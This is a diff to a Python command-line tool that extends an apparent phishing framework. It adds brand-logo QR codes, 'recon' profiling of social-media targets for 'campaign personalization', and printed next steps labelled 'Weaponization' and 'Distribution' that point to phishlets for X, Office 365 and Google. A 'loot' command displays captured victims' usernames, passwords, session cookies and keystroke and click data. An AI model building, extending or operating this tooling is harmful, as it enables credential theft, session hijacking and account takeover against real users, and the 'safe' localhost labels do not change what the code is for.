@@ -16,9 +16,11 @@ from rich.table import Table
 from core.mutation.engine import MutationEngine
 from core.mutation.scanner import DetectionScanner
 from core.common import config
+from core.recon.analyzer import get_recon_module
 import subprocess
 import sys
 import os
+import json
 import textwrap
 from core.orchestrator.autopilot import Autopilot
 from core.common.metrics import MUTATION_OPS, DETECTION_EVENTS
@@ -400,7 +402,8 @@ def safe_link(port):
 @click.option("--port", default=8888, type=int, help="Port si --url non fourni")
 @click.option("--out", default="safe_qr.png", help="Fichier PNG de sortie")
 @click.option("--allow-external", is_flag=True, help="Autoriser URL non-localhost (nécessite CONFIRM_EXTERNAL=YES)")
-def safe_qr(url, port, out, allow_external):
+@click.option("--logo", help="Chemin vers un logo à incruster (PNG)")
+def safe_qr(url, port, out, allow_external, logo):
     """Génère un QR pour une URL locale d'auto‑audit (localhost par défaut)"""
     tgt = url or f"http://localhost:{port}/"
     from urllib.parse import urlparse
@@ -410,17 +413,38 @@ def safe_qr(url, port, out, allow_external):
             console.print("[red]Refus: seules les URLs localhost/127.0.0.1 sont autorisées[/red]")
             return
     else:
-        import os
         if os.environ.get("CONFIRM_EXTERNAL") != "YES":
             console.print("[red]CONFIRM_EXTERNAL=YES requis pour une URL non‑localhost[/red]")
             return
     try:
-        import qrcode  # type: ignore
-        img = qrcode.make(tgt)
+        import qrcode
+        from PIL import Image
+        
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_H,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(tgt)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
+        
+        if logo and os.path.exists(logo):
+            icon = Image.open(logo)
+            img_w, img_h = img.size
+            factor = 4
+            size_w = int(img_w / factor)
+            size_h = int(img_h / factor)
+            icon = icon.resize((size_w, size_h), Image.LANCZOS)
+            w = int((img_w - size_w) / 2)
+            h = int((img_h - size_h) / 2)
+            img.paste(icon, (w, h), icon if icon.mode == 'RGBA' else None)
+            
         img.save(out)
         console.print(f"[green]QR enregistré[/green]: {out}")
     except Exception as e:
-        console.print(f"[red]qrcode non disponible: {e}[/red]")
+        console.print(f"[red]Erreur QR: {e}[/red]")
         console.print("Installe: python -m pip install 'qrcode[pil]' et réessaie.")
 
 @cli.command()
@@ -488,9 +512,9 @@ def mutate(file):
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
-@cli.command()
+@cli.command("scan-file")
 @click.option("--file", required=True, help="File to analyze")
-def analyze(file):
+def scan_file(file):
     """Scan a file for detection signatures"""
     try:
         with open(file, 'r') as f:
@@ -509,6 +533,121 @@ def analyze(file):
         
         console.print(table)
         
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+
+@cli.command("analyze")
+@click.option("--target", required=True, help="Target handle (e.g., @user)")
+@click.option("--platform", required=True, help="Target platform (twitter, linkedin, etc.)")
+@click.option("--out", default="target_profile.json", help="Output JSON file")
+def analyze(target, platform, out):
+    """Analyze a target profile for campaign personalization."""
+    console.print(f"[bold blue]Starting Reconnaissance on {target} ({platform})[/bold blue]")
+    try:
+        recon = get_recon_module(platform, target)
+        data = recon.analyze()
+        
+        table = Table(title=f"Recon Results: {target}")
+        table.add_column("Field", style="cyan")
+        table.add_column("Value", style="green")
+        
+        for k, v in data.items():
+            table.add_row(k, str(v))
+        
+        console.print(table)
+        
+        with open(out, "w") as f:
+            json.dump(data, f, indent=2)
+        console.print(f"[bold green]✓ Data saved to {out}[/bold green]")
+        
+        # Suggest next steps
+        phishlet_path = f"phishlets/{platform.lower()}.yaml"
+        # Try aliases
+        aliases = {
+            "twitter": "x.yaml", "x": "x.yaml",
+            "microsoft": "o365.yaml", "office365": "o365.yaml",
+            "google": "google.yaml", "gmail": "google.yaml"
+        }
+        if platform.lower() in aliases:
+            phishlet_path = f"phishlets/{aliases[platform.lower()]}"
+        
+        if os.path.exists(phishlet_path):
+            console.print(f"\n[bold yellow]Suggested Next Steps:[/bold yellow]")
+            console.print(f"1. [bold]Weaponization[/bold]: Configure phishlet\n   [green]vanta edge-run --path {phishlet_path}[/green]")
+            console.print(f"2. [bold]Distribution[/bold]: Generate QR Code\n   [green]vanta safe-qr --url http://localhost:8443 --logo core/assets/logos/{platform.lower()}.png[/green]")
+            
+    except Exception as e:
+        console.print(f"[bold red]Error: {e}[/bold red]")
+
+@cli.command("loot")
+@click.option("--id", help="Session ID to export or view")
+@click.option("--export", help="Export to JSON file")
+def loot(id, export):
+    """Manage captured sessions and credentials (Access)"""
+    try:
+        from core.edge.session import SessionManager
+        
+        sm = SessionManager()
+        sessions = sm.get_all_sessions()
+        
+        if not sessions:
+            console.print("[yellow]No sessions captured yet.[/yellow]")
+            return
+
+        if id:
+            session = sm.get_session(id)
+            if not session:
+                console.print(f"[red]Session {id} not found[/red]")
+                return
+            
+            if export:
+                with open(export, "w") as f:
+                    f.write(session.model_dump_json(indent=2))
+                console.print(f"[green]Session {id} exported to {export}[/green]")
+            else:
+                console.print(f"[bold blue]Session Details: {id}[/bold blue]")
+                console.print(f"Phishlet: {session.phishlet_name}")
+                console.print(f"IP: {session.remote_ip}")
+                console.print(f"User-Agent: {session.user_agent}")
+                console.print(f"Authenticated: {session.is_authenticated}")
+                
+                if session.credentials:
+                    console.print("\n[bold red]Credentials:[/bold red]")
+                    for cred in session.credentials:
+                        console.print(f"  User: {cred.username} | Pass: {cred.password} | Url: {cred.url}")
+                
+                if session.tokens:
+                    console.print("\n[bold yellow]Tokens (Cookies):[/bold yellow]")
+                    for k, v in session.tokens.items():
+                        console.print(f"  {k}: {v[:20]}...")
+                
+                if session.behavior_data:
+                    console.print("\n[bold cyan]Behavior Data:[/bold cyan]")
+                    console.print(f"  Keystrokes: {len(session.behavior_data.get('keystrokes', []))}")
+                    console.print(f"  Clicks: {len(session.behavior_data.get('clicks', []))}")
+                    console.print(f"  Inputs: {list(session.behavior_data.get('inputs', {}).keys())}")
+
+        else:
+            table = Table(title="Captured Sessions (Loot)")
+            table.add_column("ID", style="cyan")
+            table.add_column("Phishlet", style="magenta")
+            table.add_column("IP", style="green")
+            table.add_column("Auth?", style="yellow")
+            table.add_column("Creds", style="red")
+            table.add_column("Last Active", style="blue")
+            
+            for s in sessions:
+                table.add_row(
+                    s.session_id,
+                    s.phishlet_name,
+                    s.remote_ip,
+                    "YES" if s.is_authenticated else "NO",
+                    str(len(s.credentials)),
+                    s.last_activity.strftime("%Y-%m-%d %H:%M:%S")
+                )
+            console.print(table)
+            console.print("\n[dim]Use --id <ID> to view details or export[/dim]")
+
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
